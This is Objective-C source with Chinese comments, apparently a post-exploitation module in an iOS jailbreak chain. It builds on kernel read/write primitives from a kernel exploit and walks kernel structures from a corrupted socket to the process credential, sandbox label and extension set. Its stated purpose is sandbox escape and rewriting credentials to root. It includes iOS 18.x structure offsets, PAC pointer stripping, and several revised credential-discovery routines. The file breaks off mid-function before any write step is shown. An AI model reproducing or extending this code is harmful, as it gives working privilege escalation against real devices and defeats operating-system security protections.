//
//  DSEscape.m — 沙盒逃逸 + root 凭据改写（基于 ClearSword 的内核读写原语）
//
//  原语：early_kread64 / early_kwrite64（ClearSword 的 krw.c，0x20 字节读改写）
//  所有 offset 说明都写在下面，来源是两份公开实现的交叉对照：
//    * FilzaJailedDS/kexploit/offsets.m（按 iOS 版本 + CPU 家族的 offset 表）
//    * 34306/FilzaJailedDS 的 sandbox_escape.m（proc→proc_ro→ucred→cr_label→sandbox→ext 链路常量）
//

#import <Foundation/Foundation.h>
#import <stdarg.h>
#import <string.h>
#import <unistd.h>
#import <fcntl.h>
#import <errno.h>

#import "DSEscape.h"

#import "common.h"   // ClearSword: g_ctx / g_offsets
#import "krw.h"      // ClearSword: early_kread64 / early_kwrite64

#pragma mark - offset 常量

// proc / thread（18.x 稳定，且下面还会用 getpid() 反向校验，错了会被拒掉）
#define DS_OFF_PROC_RO            0x18ULL   // proc → proc_ro
#define DS_OFF_PROC_PID           0x60ULL   // proc → p_pid
#define DS_OFF_PROC_RO_TRO_PROC   0x18ULL   // thread_ro → tro_proc
#define DS_OFF_INPCB_INP_SOCKET   0x40ULL   // inpcb → inp_socket
#define DS_OFF_SOCKET_BG_THREAD   0x2b0ULL  // socket → so_background_thread（18.0-18.7）

// ucred / label / sandbox（跨 6 个 kernelcache 验证过的常量）
#define DS_OFF_UCRED_CR_LABEL     0x78ULL   // ucred → cr_label
#define DS_OFF_LABEL_SANDBOX      0x10ULL   // label → sandbox（l_perpolicy[1]）
#define DS_OFF_SANDBOX_EXT_SET    0x10ULL   // sandbox → ext_set
#define DS_OFF_EXT_DATA           0x40ULL   // ext → data
#define DS_OFF_EXT_DATALEN        0x48ULL   // ext → data_len

// posix_cred 在 ucred+0x18
#define DS_OFF_UCRED_POSIX        0x18ULL
#define DS_OFF_POSIX_UID          0x00ULL
#define DS_OFF_POSIX_RUID         0x04ULL
#define DS_OFF_POSIX_SVUID        0x08ULL
#define DS_OFF_POSIX_NGROUPS      0x0CULL
#define DS_OFF_POSIX_GROUPS_0     0x10ULL
#define DS_OFF_POSIX_RGID         0x50ULL
#define DS_OFF_POSIX_SVGID        0x54ULL

#define DS_EXT_SLOTS 16

#pragma mark - 日志

static ds_escape_log_fn gLog = NULL;

static void ds_log(const char *format, ...)
{
    if (!gLog) return;
    char buffer[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    gLog(buffer);
}

#pragma mark - 安全的读 / 写

// 与上游 is_kaddr_valid 同一判据：高 24 位必须是 0xfffff…
static inline bool ds_is_kaddr(uint64_t addr)
{
    return (addr & 0xfffff00000000000ULL) == 0xfffff00000000000ULL;
}

/// 只认两个「确定已映射」的区域：
///   heap/zone  0xffffffe000000000 – 0xffffffefffffffff
///   kernel 静态段 0xfffffff000000000 – 0xfffffffeffffffff
/// 其它一律不碰，避免解引用未映射地址把内核打崩（我们已经被这个问题坑过一次）。
static inline bool ds_is_kernel_region(uint64_t address)
{
    return (address >= 0xffffffe000000000ULL && address < 0xfffffff000000000ULL) ||
           (address >= 0xfffffff000000000ULL && address < 0xfffffffeffffffffULL);
}

/// XPACI / XPACD：arm64e 上剥离指针签名。用 naked 函数直接放指令字节，
/// 所以 arm64 产物在 arm64e 硬件上也能执行（与上游 xpaci.h 同一手法）。
static uint64_t __attribute__((naked)) ds_xpaci(uint64_t value)
{
    __asm__ volatile(".long 0xDAC143E0");   // XPACI X0
    __asm__ volatile("ret");
}

static uint64_t __attribute__((naked)) ds_xpacd(uint64_t value)
{
    __asm__ volatile(".long 0xDAC147E0");   // XPACD X0
    __asm__ volatile("ret");
}

#define DS_FORM_COUNT 6

/// 把一个可能带 PAC 签名 / 高位被抹掉的指针，还原成若干候选 VA（只保留落在已知映射区里的）
static int ds_pointer_forms(uint64_t raw, uint64_t out[DS_FORM_COUNT])
{
    if (!raw) return 0;

    // 实测数据（iOS 18.5 / A14）：cr_label 存的是 fe988be09fe407c0，
    // 真正的 VA 是低 36 位补堆段 → 0xffffffe09fe407c0。所以这一形态必须优先。
    uint64_t forms[DS_FORM_COUNT] = {
        raw,
        (raw & 0x0000000FFFFFFFFFULL) | 0xFFFFFFE000000000ULL,   // 低 36 位 + 堆段
        (raw & 0x0000000FFFFFFFFFULL) | 0xFFFFFFF000000000ULL,   // 低 36 位 + 静态段
        (raw & 0x0000FFFFFFFFFFFFULL) | 0xFFFF000000000000ULL,   // 低 48 位 + 内核段
        ds_xpaci(raw),
        ds_xpacd(raw)
    };

    int count = 0;
    for (int i = 0; i < DS_FORM_COUNT; i++) {
        uint64_t value = forms[i];
        if (!value || !ds_is_kernel_region(value)) continue;
        bool duplicate = false;
        for (int k = 0; k < count; k++) if (out[k] == value) duplicate = true;
        if (!duplicate) out[count++] = value;
    }
    return count;
}

/// 地址非法就返回 0，绝不调用 early_kread（那会触发上游的故意崩溃 / while(1)）
static uint64_t ds_kread_safe(uint64_t addr)
{
    if (!ds_is_kaddr(addr)) return 0;
    return early_kread64(addr);
}

static uint32_t ds_kread32_safe(uint64_t addr)
{
    return (uint32_t)(ds_kread_safe(addr) & 0xFFFFFFFFULL);
}

/// lara 的「合法内核指针」判据（is_kptr）：0xffff 前缀
static inline bool ds_is_kptr(uint64_t p)
{
    return (p & 0xffff000000000000ULL) == 0xffff000000000000ULL;
}

/// **完全照抄 lara** 的指针还原：`#define S(x) ({ uint64_t _v = xpaci(x); signptr(_v); })`
///   signptr(v): 若 (v>>32) > 0xFFFF 则 v |= pac_mask
///   pac_mask（lara offsets.m）= ~((1ULL << (64 - t1sz_boot)) - 1ULL)，即 va_bits 之上的掩码；
///   对已经 0xffff 前缀的值是 no-op，所以这里用 47 位 VA 的掩码即可。
///
/// 只做**值变换**，绝不解引用 —— 这一点非常重要：
/// 上一版我生成了 5 种候选 VA 并逐个解引用，其中一个是「在区间内但实际未映射」的假地址，
/// 一读就把内核打崩了（设备重启）。现在每跳只产出**一个**地址，且与 lara 完全一致。
static uint64_t ds_normalize_ptr(uint64_t raw)
{
    if (!raw) return 0;

    uint64_t v = ds_xpaci(raw);                       // XPACI：剥 IA key 签名
    if ((v >> 32) <= 0xFFFF) v = ds_xpacd(raw);       // 兜底：万一用的是 DA key
    if ((v >> 32) > 0xFFFF) v |= 0xFFFF800000000000ULL;  // signptr(v)
    return v;
}

#pragma mark - 找到本进程的 proc

static uint64_t gSelfProc = 0;
static uint64_t gThreadTroOffset = 0;
static uint64_t gUcredSlotOffset = 0;
static uint64_t gUcred = 0;

/// 从（已被漏洞破坏的）socket pcb 出发：inpcb → socket → thread → thread_ro → proc
/// thread→thread_ro 的 offset 不写死，0x300…0x480 里扫，并用 p_pid == getpid() 反向验证。
static uint64_t ds_find_self_proc(void)
{
    if (gSelfProc) return gSelfProc;

    uint64_t pcb = g_ctx.control_socket_pcb;
    if (!ds_is_kaddr(pcb)) pcb = g_ctx.rw_socket_pcb;
    if (!ds_is_kaddr(pcb)) {
        ds_log("[逃逸] socket pcb 无效（control=0x%llx rw=0x%llx）：漏洞这次没成功",
               (unsigned long long)g_ctx.control_socket_pcb,
               (unsigned long long)g_ctx.rw_socket_pcb);
        return 0;
    }

    uint64_t socket = ds_kread_safe(pcb + DS_OFF_INPCB_INP_SOCKET);
    if (!ds_is_kaddr(socket)) {
        ds_log("[逃逸] inpcb→socket 读出来不是内核地址（0x%llx）", (unsigned long long)socket);
        return 0;
    }

    uint64_t thread = ds_kread_safe(socket + DS_OFF_SOCKET_BG_THREAD);
    if (!ds_is_kaddr(thread)) {
        ds_log("[逃逸] socket→so_background_thread 读出来不是内核地址（0x%llx）", (unsigned long long)thread);
        return 0;
    }

    pid_t mypid = getpid();
    uint32_t pidOffsets[3] = { (uint32_t)DS_OFF_PROC_PID, 0x68, 0x58 };

    for (uint64_t troOff = 0x300; troOff <= 0x480; troOff += 8) {
        uint64_t tro = ds_kread_safe(thread + troOff);
        if (!ds_is_kaddr(tro)) continue;

        uint64_t proc = ds_kread_safe(tro + DS_OFF_PROC_RO_TRO_PROC);
        if (!ds_is_kaddr(proc)) continue;

        for (int i = 0; i < 3; i++) {
            uint32_t pid = ds_kread32_safe(proc + pidOffsets[i]);
            if ((pid_t)pid == mypid) {
                gThreadTroOffset = troOff;
                gSelfProc = proc;
                ds_log("[逃逸] 自校验通过：thread_t_tro=0x%llx p_pid@0x%x self_proc=0x%llx (pid=%d)",
                       (unsigned long long)troOff, pidOffsets[i],
                       (unsigned long long)proc, (int)mypid);
                return proc;
            }
        }
    }

    ds_log("[逃逸] 扫描 0x300-0x480 没找到能通过 pid 校验的 thread_ro，放弃（不做任何写操作）");
    return 0;
}

/// proc → proc_ro → 扫描 ucred 槽位（p_ucred 在 18.4+ 挪过位置，所以扫描而不是写死）
static uint64_t ds_find_ucred(uint64_t proc)
{
    if (gUcred) return gUcred;

    uint64_t procRo = ds_kread_safe(proc + DS_OFF_PROC_RO);
    if (!ds_is_kaddr(procRo)) {
        ds_log("[逃逸] proc→proc_ro 读出来不是内核地址（0x%llx）", (unsigned long long)procRo);
        return 0;
    }

    for (uint64_t off = 0x10; off <= 0x40; off += 8) {
        uint64_t raw = ds_kread_safe(procRo + off);
        if (!raw) continue;

        uint64_t cand = ds_normalize_ptr(raw);
        if (!ds_is_kaddr(cand)) continue;

        uint64_t label = ds_kread_safe(cand + DS_OFF_UCRED_CR_LABEL);
        if (!ds_is_kaddr(label)) continue;

        uint64_t sandbox = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
        if (!ds_is_kaddr(sandbox)) continue;

        // 额外确认 sandbox→ext_set 也是一条合法链路，避免把别的结构当 ucred
        uint64_t extSet = ds_kread_safe(sandbox + DS_OFF_SANDBOX_EXT_SET);
        if (!ds_is_kaddr(extSet)) continue;

        gUcredSlotOffset = off;
        gUcred = cand;
        ds_log("[逃逸] 找到 ucred：proc_ro+0x%llx = 0x%llx，cr_label=0x%llx，sandbox=0x%llx，ext_set=0x%llx",
               (unsigned long long)off, (unsigned long long)cand,
               (unsigned long long)label, (unsigned long long)sandbox, (unsigned long long)extSet);
        return cand;
    }

    ds_log("[逃逸] 在 proc_ro+0x10…0x40 里没找到形状正确的 ucred，放弃（不做任何写操作）");
    return 0;
}

#pragma mark - 身份发现（多候选穷举 + 自校验）

static uint64_t gSelfSocketObject = 0;

/// 找到「能通过 getpid() 校验」的 self proc，再拿到 ucred。
///
/// 实测教训（iPhone13,4 / iOS 18.5）：`control_socket_pcb` 这条链上
/// `so_background_thread` 是 0 —— 那个字段只在特定 socket 上被设置。
/// 所以这里把两条 pcb、几个字段 offset 全部穷举一遍，每一跳先验地址合法性，
/// 最后必须 p_pid == getpid() 才算数；全都失败就走 socket 引用 ucred 的退路。
static uint64_t ds_discover_identities(void)
{
    if (gUcred) return gUcred;

    const pid_t mypid = getpid();
    uint64_t pcbs[2] = { g_ctx.rw_socket_pcb, g_ctx.control_socket_pcb };
    const uint64_t inpSocketOffsets[3] = { 0x40, 0x38, 0x48 };
    const uint64_t bgThreadOffsets[5] = { 0x2b0, 0x298, 0x2a8, 0x2b8, 0x2c0 };
    const uint32_t pidOffsets[3] = { 0x60, 0x68, 0x58 };

    int socketCandidates = 0;

    // 第一步：穷举出 self proc
    if (!gSelfProc) {
        for (int p = 0; p < 2 && !gSelfProc; p++) {
            uint64_t pcb = pcbs[p];
            if (!ds_is_kaddr(pcb)) continue;
            ds_log("[逃逸] 候选 pcb[%d] = 0x%llx", p, (unsigned long long)pcb);

            for (int i = 0; i < 3 && !gSelfProc; i++) {
                uint64_t socket = ds_kread_safe(pcb + inpSocketOffsets[i]);
                if (!ds_is_kaddr(socket)) continue;

                socketCandidates++;
                if (!gSelfSocketObject) gSelfSocketObject = socket;
                ds_log("[逃逸] 候选 socket = 0x%llx（pcb+0x%llx）",
                       (unsigned long long)socket, (unsigned long long)inpSocketOffsets[i]);

                for (int b = 0; b < 5 && !gSelfProc; b++) {
                    uint64_t thread = ds_kread_safe(socket + bgThreadOffsets[b]);
                    if (!ds_is_kaddr(thread)) continue;

                    for (uint64_t troOff = 0x300; troOff <= 0x4A0 && !gSelfProc; troOff += 8) {
                        uint64_t tro = ds_kread_safe(thread + troOff);
                        if (!ds_is_kaddr(tro)) continue;

                        uint64_t proc = ds_kread_safe(tro + DS_OFF_PROC_RO_TRO_PROC);
                        if (!ds_is_kaddr(proc)) continue;

                        for (int k = 0; k < 3; k++) {
                            if ((pid_t)ds_kread32_safe(proc + pidOffsets[k]) != mypid) continue;
                            gThreadTroOffset = troOff;
                            gSelfProc = proc;
                            ds_log("[逃逸] 自校验通过：so_bg_thread@0x%llx thread_t_tro@0x%llx "
                                    "p_pid@0x%x self_proc=0x%llx (pid=%d)",
                                   (unsigned long long)bgThreadOffsets[b],
                                   (unsigned long long)troOff, pidOffsets[k],
                                   (unsigned long long)proc, (int)mypid);
                            break;
                        }
                    }
                }
            }
        }
    }

    if (!gSelfProc) {
        ds_log("[逃逸] 没能定位 self proc（试了 %d 个 socket 候选），改用退路", socketCandidates);
    }

    // 第二步：proc 路线拿 ucred
    if (gSelfProc) {
        uint64_t ucred = ds_find_ucred(gSelfProc);
        if (ucred) return ucred;
    }

    // 第三步：退路 —— 直接扫 socket 对象里引用的 ucred
    // （socket 创建时会引用本进程当时的 cred，是同一个对象，改它的 label 一样能开沙盒）
    if (ds_is_kaddr(gSelfSocketObject)) {
        ds_log("[逃逸] 退路：在 socket 对象 0x%llx 里扫 ucred 形状的指针",
               (unsigned long long)gSelfSocketObject);
        for (uint64_t off = 0x00; off <= 0x400; off += 8) {
            uint64_t raw = ds_kread_safe(gSelfSocketObject + off);
            if (!raw) continue;

            uint64_t cand = ds_normalize_ptr(raw);
            if (!ds_is_kaddr(cand)) continue;

            uint64_t label = ds_kread_safe(cand + DS_OFF_UCRED_CR_LABEL);
            if (!ds_is_kaddr(label)) continue;

            uint64_t sandbox = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
            if (!ds_is_kaddr(sandbox)) continue;

            uint64_t extSet = ds_kread_safe(sandbox + DS_OFF_SANDBOX_EXT_SET);
            if (!ds_is_kaddr(extSet)) continue;

            gUcred = cand;
            ds_log("[逃逸] 退路成功：socket+0x%llx = ucred 0x%llx（label=0x%llx sandbox=0x%llx ext_set=0x%llx）",
                   (unsigned long long)off, (unsigned long long)cand,
                   (unsigned long long)label, (unsigned long long)sandbox, (unsigned long long)extSet);
            return cand;
        }
        ds_log("[逃逸] 退路也没找到 ucred");
    }

    return 0;
}

#pragma mark - 身份发现 v2（offset 组合穷举 + 四道校验 + 失败转储）

typedef struct {
    uint64_t labelOff;    // ucred → cr_label
    uint64_t sandboxOff;  // label → sandbox
    uint64_t extSetOff;   // sandbox → ext_set
} ds_cred_offsets_t;

static ds_cred_offsets_t gCredOff = { DS_OFF_UCRED_CR_LABEL, DS_OFF_LABEL_SANDBOX, DS_OFF_SANDBOX_EXT_SET };

/// 把 cand 当成 ucred 来验：
///   cand+labelOff → label（内核指针）
///   label+sandboxOff → sandbox（内核指针）
///   sandbox+extSetOff → ext_set（内核指针）
///   ext_set 里至少有一个槽位能读出 ext 头，且 头+0x8 是内核指针
/// 四道都过才认，并且把命中的 offset 组合回填，后面改写就用同一组。
static bool ds_validate_ucred(uint64_t cand, ds_cred_offsets_t *out)
{
    static const uint64_t labelOffs[]   = { 0x78, 0x70, 0x80, 0x68, 0x88 };
    static const uint64_t sandboxOffs[] = { 0x10, 0x08, 0x18, 0x20 };
    static const uint64_t extSetOffs[]  = { 0x10, 0x08, 0x18, 0x20 };

    for (int a = 0; a < 5; a++) {
        uint64_t label = ds_kread_safe(cand + labelOffs[a]);
        if (!ds_is_kaddr(label)) continue;

        for (int b = 0; b < 4; b++) {
            uint64_t sandbox = ds_kread_safe(label + sandboxOffs[b]);
            if (!ds_is_kaddr(sandbox)) continue;

            for (int c = 0; c < 4; c++) {
                uint64_t extSet = ds_kread_safe(sandbox + extSetOffs[c]);
                if (!ds_is_kaddr(extSet)) continue;

                // 第四道：ext_set 里要有真正的 ext 链
                bool extLooksRight = false;
                for (int slot = 0; slot < 8 && !extLooksRight; slot++) {
                    uint64_t hdr = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
                    if (!ds_is_kaddr(hdr)) continue;
                    uint64_t ext = ds_normalize_ptr(ds_kread_safe(hdr + 0x8));
                    if (ds_is_kaddr(ext)) extLooksRight = true;
                }
                if (!extLooksRight) continue;

                if (out) {
                    out->labelOff = labelOffs[a];
                    out->sandboxOff = sandboxOffs[b];
                    out->extSetOff = extSetOffs[c];
                }
                return true;
            }
        }
    }
    return false;
}

/// 在某个内核对象的地址范围里扫「ucred 形状」的指针
static uint64_t ds_scan_object_for_ucred(uint64_t base, uint64_t limit, const char *what)
{
    if (!ds_is_kaddr(base)) return 0;

    ds_log("[逃逸] 在 %s(0x%llx) 的 0x0–0x%llx 里扫 ucred",
           what, (unsigned long long)base, (unsigned long long)limit);

    for (uint64_t off = 0; off < limit; off += 8) {
        uint64_t raw = ds_kread_safe(base + off);
        if (!raw) continue;

        uint64_t cand = ds_normalize_ptr(raw);
        if (!ds_is_kaddr(cand)) continue;

        ds_cred_offsets_t offs;
        if (ds_validate_ucred(cand, &offs)) {
            gCredOff = offs;
            ds_log("[逃逸] 命中：%s+0x%llx = ucred 0x%llx（cr_label@0x%llx label→sandbox@0x%llx sandbox→ext_set@0x%llx）",
                   what, (unsigned long long)off, (unsigned long long)cand,
                   (unsigned long long)offs.labelOff, (unsigned long long)offs.sandboxOff,
                   (unsigned long long)offs.extSetOff);
            return cand;
        }
    }
    return 0;
}

/// 失败时把对象的原始字转储出来（只读同一对象内部，绝对安全），便于下一轮定位真实 offset
static void ds_dump_words(const char *tag, uint64_t base, int words)
{
    if (!ds_is_kaddr(base)) return;
    for (int i = 0; i < words; i += 4) {
        char line[256];
        int n = snprintf(line, sizeof(line), "[转储] %s+0x%03x:", tag, i * 8);
        if (n < 0) continue;
        for (int k = 0; k < 4 && (i + k) < words; k++) {
            int m = snprintf(line + n, sizeof(line) - (size_t)n, " %016llx",
                             (unsigned long long)ds_kread_safe(base + (uint64_t)(i + k) * 8));
            if (m < 0) break;
            n += m;
        }
        ds_log("%s", line);
    }
}

static uint64_t ds_discover_identities_v2(void)
{
    if (gUcred) return gUcred;

    // 漏洞自己就是用 rw_socket_pcb+0x40 当 socket 对象去改 refcount 的，这个锚点最可信
    uint64_t socketObject = ds_kread_safe(g_ctx.rw_socket_pcb + DS_OFF_INPCB_INP_SOCKET);
    if (!ds_is_kaddr(socketObject)) {
        socketObject = ds_kread_safe(g_ctx.control_socket_pcb + DS_OFF_INPCB_INP_SOCKET);
    }
    if (ds_is_kaddr(socketObject)) {
        gSelfSocketObject = socketObject;
        ds_log("[逃逸] socket 对象 = 0x%llx（rw_socket_pcb+0x%llx）",
               (unsigned long long)socketObject, (unsigned long long)DS_OFF_INPCB_INP_SOCKET);
    }

    // 路线一：socket → so_background_thread → thread → thread_ro → proc
    if (ds_is_kaddr(socketObject)) {
        const pid_t mypid = getpid();
        const uint32_t pidOffsets[3] = { 0x60, 0x68, 0x58 };
        for (uint64_t bgOff = 0x280; bgOff <= 0x300 && !gSelfProc; bgOff += 8) {
            uint64_t thread = ds_kread_safe(socketObject + bgOff);
            if (!ds_is_kaddr(thread)) continue;

            for (uint64_t troOff = 0x300; troOff <= 0x4A0 && !gSelfProc; troOff += 8) {
                uint64_t tro = ds_kread_safe(thread + troOff);
                if (!ds_is_kaddr(tro)) continue;

                uint64_t proc = ds_kread_safe(tro + DS_OFF_PROC_RO_TRO_PROC);
                if (!ds_is_kaddr(proc)) continue;

                for (int k = 0; k < 3; k++) {
                    if ((pid_t)ds_kread32_safe(proc + pidOffsets[k]) != mypid) continue;
                    gThreadTroOffset = troOff;
                    gSelfProc = proc;
                    ds_log("[逃逸] self proc 命中：so_bg_thread@0x%llx thread_t_tro@0x%llx p_pid@0x%x proc=0x%llx",
                           (unsigned long long)bgOff, (unsigned long long)troOff, pidOffsets[k],
                           (unsigned long long)proc);
                    break;
                }
            }
        }
    }

    // 路线二：proc → proc_ro → ucred
    if (gSelfProc) {
        uint64_t procRo = ds_kread_safe(gSelfProc + DS_OFF_PROC_RO);
        uint64_t ucred = ds_scan_object_for_ucred(procRo, 0x60, "proc_ro");
        if (ucred) { gUcred = ucred; return ucred; }
        ds_log("[逃逸] proc 找到了但 proc_ro 里没有 ucred（proc_ro=0x%llx）", (unsigned long long)procRo);
    } else {
        ds_log("[逃逸] 没找到 self proc（so_background_thread 在 0x280–0x300 全是非指针）");
    }

    // 路线三：直接扫 socket 对象里引用的 ucred（同一个 cred 对象，改它的 label 一样能开沙盒）
    if (ds_is_kaddr(socketObject)) {
        uint64_t ucred = ds_scan_object_for_ucred(socketObject, 0x800, "socket");
        if (ucred) { gUcred = ucred; return ucred; }
    }

    // 全失败：转储关键对象，下一轮照着实测数据改 offset（只读同一对象内部，安全）
    ds_log("[逃逸] 三条路线都没命中，转储关键对象供定位：");
    ds_dump_words("rw_pcb", g_ctx.rw_socket_pcb, 0x20);
    if (ds_is_kaddr(socketObject)) ds_dump_words("socket", socketObject, 0x60);
    ds_log("[逃逸] 转储结束");
    return 0;
}

#pragma mark - 身份发现 v3（零风险：只比较，不猜）

/// 内核堆区间（zone）。内核静态段是 0xfffffff0…，两者不重叠。
static inline bool ds_is_heap_pointer(uint64_t address)
{
    return address >= 0xffffffe000000000ULL && address < 0xfffffff000000000ULL;
}

/// 收集几个「确定是 socket」的对象地址：
///   rw/control pcb + 0x40，再顺着 pcb 链表（pcb+0x20）多走两跳。
/// 只做对象内的读，不猜地址。
static int ds_collect_sockets(uint64_t *out, int maxCount)
{
    int count = 0;
    uint64_t seeds[3];
    int seedCount = 0;

    if (ds_is_kaddr(g_ctx.rw_socket_pcb)) seeds[seedCount++] = g_ctx.rw_socket_pcb;
    if (ds_is_kaddr(g_ctx.control_socket_pcb) && g_ctx.control_socket_pcb != g_ctx.rw_socket_pcb) {
        seeds[seedCount++] = g_ctx.control_socket_pcb;
    }
    // 顺着 inpcb 链再拿一个
    if (ds_is_kaddr(g_ctx.rw_socket_pcb)) {
        uint64_t next = ds_kread_safe(g_ctx.rw_socket_pcb + 0x20);
        if (ds_is_kaddr(next) && next != g_ctx.rw_socket_pcb) seeds[seedCount < 3 ? seedCount++ : 0] = next;
    }

    for (int i = 0; i < seedCount && count < maxCount; i++) {
        uint64_t sock = ds_kread_safe(seeds[i] + DS_OFF_INPCB_INP_SOCKET);
        if (!ds_is_kaddr(sock)) continue;
        bool duplicate = false;
        for (int k = 0; k < count; k++) if (out[k] == sock) duplicate = true;
        if (!duplicate) out[count++] = sock;
    }
    return count;
}

/// v3 策略（实测教训：暴力扫描会 panic，绝对不能对来路不明的指针解引用）：
///   1) 同一进程创建的多个 socket，其 so_cred 指向**同一个** cred 对象
///      → 先在两个 socket 里找「同一 offset 上相同的堆指针」，只解引用这几个；
///   2) 解引用后用 cr_uid == getuid() 二次确认，确认了才继续；
///   3) 确认不了就只转储、绝不写内核内存。
static uint64_t ds_discover_identities_v3(void)
{
    if (gUcred) return gUcred;

    uint64_t sockets[3] = { 0, 0, 0 };
    int socketCount = ds_collect_sockets(sockets, 3);
    ds_log("[逃逸] 收集到 %d 个 socket 对象：0x%llx 0x%llx 0x%llx", socketCount,
           (unsigned long long)sockets[0], (unsigned long long)sockets[1], (unsigned long long)sockets[2]);
    if (socketCount > 0) gSelfSocketObject = sockets[0];

    const uint32_t myuid = getuid();

    // 规则一：两个 socket 在同一 offset 指向同一个堆对象 → 极可能是 so_cred
    if (socketCount >= 2) {
        for (uint64_t off = 0; off < 0x1000; off += 8) {
            uint64_t a = ds_kread_safe(sockets[0] + off);
            if (!a) continue;
            uint64_t b = ds_kread_safe(sockets[1] + off);
            if (a != b) continue;

            uint64_t cand = ds_normalize_ptr(a);
            if (!ds_is_heap_pointer(cand)) continue;
            if ((cand & 0xF) != 0) continue;   // zone 对象都是 16 字节对齐，先用这个把垃圾值滤掉

            uint32_t uid = ds_kread32_safe(cand + DS_OFF_UCRED_POSIX);
            if (uid != myuid) continue;

            gUcred = cand;
            ds_log("[逃逸] 命中（两 socket 一致 + cr_uid 校验）：socket+0x%llx → cred 0x%llx（uid=%u）",
                   (unsigned long long)off, (unsigned long long)cand, uid);
            return cand;
        }
        ds_log("[逃逸] 两个 socket 没有共同的堆指针能通过 cr_uid 校验");
    }

    // 规则二：只在堆指针里找、且必须 cr_uid 对得上（每个 offset 最多一次解引用，范围有界）
    for (int s = 0; s < socketCount; s++) {
        for (uint64_t off = 0; off < 0x800; off += 8) {
            uint64_t raw = ds_kread_safe(sockets[s] + off);
            if (!raw) continue;
            uint64_t cand = ds_normalize_ptr(raw);
            if (!ds_is_heap_pointer(cand)) continue;
            if ((cand & 0xF) != 0) continue;   // 同上：只解引用 16 字节对齐的堆对象
            if (ds_kread32_safe(cand + DS_OFF_UCRED_POSIX) != myuid) continue;

            gUcred = cand;
            ds_log("[逃逸] 命中（单 socket + cr_uid 校验）：socket%d+0x%llx → cred 0x%llx",
                   s, (unsigned long long)off, (unsigned long long)cand);
            return cand;
        }
    }

    // 规则三：给「so_background_thread 会被填充」的机型留的路（本机是 0，会直接跳过）。
    // 全程用 heap+对齐+p_pid 三重校验，确认 proc 之后才去 proc_ro 里按 cr_uid 找 cred。
    if (socketCount >= 1 && ds_is_heap_pointer(sockets[0])) {
        uint64_t thread = ds_kread_safe(sockets[0] + DS_OFF_SOCKET_BG_THREAD);
        if (ds_is_heap_pointer(thread) && (thread & 0xF) == 0) {
            for (uint64_t troOff = 0x300; troOff <= 0x4A0; troOff += 8) {
                uint64_t tro = ds_kread_safe(thread + troOff);
                if (!ds_is_heap_pointer(tro) || (tro & 0xF) != 0) continue;

                uint64_t proc = ds_kread_safe(tro + DS_OFF_PROC_RO_TRO_PROC);
                if (!ds_is_heap_pointer(proc) || (proc & 0xF) != 0) continue;
                if ((pid_t)ds_kread32_safe(proc + DS_OFF_PROC_PID) != getpid()) continue;

                uint64_t procRo = ds_kread_safe(proc + DS_OFF_PROC_RO);
                for (uint64_t off = 0x10; off <= 0x40; off += 8) {
                    uint64_t cand = ds_normalize_ptr(ds_kread_safe(procRo + off));
                    if (!ds_is_heap_pointer(cand) || (cand & 0xF) != 0) continue;
                    if (ds_kread32_safe(cand + DS_OFF_UCRED_POSIX) != myuid) continue;

                    gThreadTroOffset = troOff;
                    gSelfProc = proc;
                    gUcred = cand;
                    ds_log("[逃逸] 命中（socket→thread→proc→proc_ro + p_pid/cr_uid 校验）："
                            "so_bg_thread@0x%llx thread_t_tro@0x%llx proc=0x%llx cred=0x%llx",
                           (unsigned long long)DS_OFF_SOCKET_BG_THREAD, (unsigned long long)troOff,
                           (unsigned long long)proc, (unsigned long long)cand);
                    return cand;
                }
            }
        }
    }

    // 都没命中：只转储（对象内读，安全），下一轮照实测数据修正
    ds_log("[逃逸] 未能确认本进程 cred，转储关键对象（不做任何写操作）：");
    ds_dump_words("rw_pcb", g_ctx.rw_socket_pcb, 0x20);
    ds_dump_words("control_pcb", g_ctx.control_socket_pcb, 0x20);
    if (ds_is_kaddr(sockets[0])) ds_dump_words("socket0", sockets[0], 0x80);
    if (ds_is_kaddr(sockets[1]) && sockets[1] != sockets[0]) ds_dump_words("socket1", sockets[1], 0x80);
    ds_log("[逃逸] 转储结束");
    return 0;
}

#pragma mark - 沙盒链路解析（起点是已被 cr_uid 确认的 cred）

/// 从确认过的 ucred 出发，解析 ucred → label → sandbox → ext_set。
///
/// 为什么可以试多组 offset：起点是**已被 cr_uid 校验过的真 cred**（不是来路不明的字），
/// 而且 label 有很强的结构签名——`l_perpolicy[0]`(AMFI) 与 `l_perpolicy[1]`(sandbox) 必须同时是内核指针；
/// ext_set 还要能读出真正的 ext 链。三道都对上才认。
/// 单路解析（与 lara pe/sbx.m 的 sbx_escape 完全一致）：
///   cred →(0x78) label →(+0x10) sandbox →(+0x10) ext_set
/// 每跳只做一次解引用、只做一种指针还原，没有任何扫描或候选试探。
static uint64_t ds_resolve_sandbox_extset(uint64_t cred, uint64_t *outSandbox)
{
    uint64_t rawLabel = ds_kread_safe(cred + DS_OFF_UCRED_CR_LABEL);
    uint64_t label = ds_normalize_ptr(rawLabel);
    if (!ds_is_kptr(label)) {
        ds_log("[逃逸] cred+0x%llx = 0x%llx → 还原后 0x%llx 不是内核指针，停手（不写内核内存）",
               (unsigned long long)DS_OFF_UCRED_CR_LABEL,
               (unsigned long long)rawLabel, (unsigned long long)label);
        return 0;
    }

    uint64_t rawSandbox = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
    uint64_t sandbox = ds_normalize_ptr(rawSandbox);
    if (!ds_is_kptr(sandbox)) {
        ds_log("[逃逸] label=0x%llx，label+0x%llx = 0x%llx → 还原后 0x%llx 不是内核指针，停手",
               (unsigned long long)label, (unsigned long long)DS_OFF_LABEL_SANDBOX,
               (unsigned long long)rawSandbox, (unsigned long long)sandbox);
        return 0;
    }

    uint64_t rawExtSet = ds_kread_safe(sandbox + DS_OFF_SANDBOX_EXT_SET);
    uint64_t extSet = ds_normalize_ptr(rawExtSet);
    if (!ds_is_kptr(extSet)) {
        ds_log("[逃逸] sandbox=0x%llx，sandbox+0x%llx = 0x%llx → 还原后 0x%llx 不是内核指针，停手",
               (unsigned long long)sandbox, (unsigned long long)DS_OFF_SANDBOX_EXT_SET,
               (unsigned long long)rawExtSet, (unsigned long long)extSet);
        return 0;
    }

    if (outSandbox) *outSandbox = sandbox;
    ds_log("[逃逸] 链路：cred=0x%llx → label=0x%llx → sandbox=0x%llx → ext_set=0x%llx",
           (unsigned long long)cred, (unsigned long long)label,
